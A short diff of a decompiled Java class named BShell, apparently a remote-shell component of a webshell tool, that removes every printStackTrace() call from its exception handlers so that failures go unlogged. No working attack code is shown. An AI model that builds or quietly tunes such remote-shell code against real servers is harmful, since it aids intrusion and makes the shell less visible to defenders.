@@ -61,7 +61,6 @@ public class BShell implements Runnable {
             ((Map)result).put("status", "success");
          }
       } catch (Exception var6) {
-         var6.printStackTrace();
          ((Map)result).put("msg", var6.getMessage());
          ((Map)result).put("status", "fail");
       }
@@ -73,7 +72,6 @@ public class BShell implements Runnable {
          so.close();
          page.getOut().clear();
       } catch (Exception var5) {
-         var5.printStackTrace();
       }
 
       return true;
@@ -229,7 +227,6 @@ public class BShell implements Runnable {
             }
          }
       } catch (IOException var5) {
-         var5.printStackTrace();
       }
    }
 
@@ -288,7 +285,6 @@ public class BShell implements Runnable {
             (new StringBuilder()).append("BShell_").append(remoteIP).toString();
          }
       } catch (IOException var5) {
-         var5.printStackTrace();
       }
    }
 }
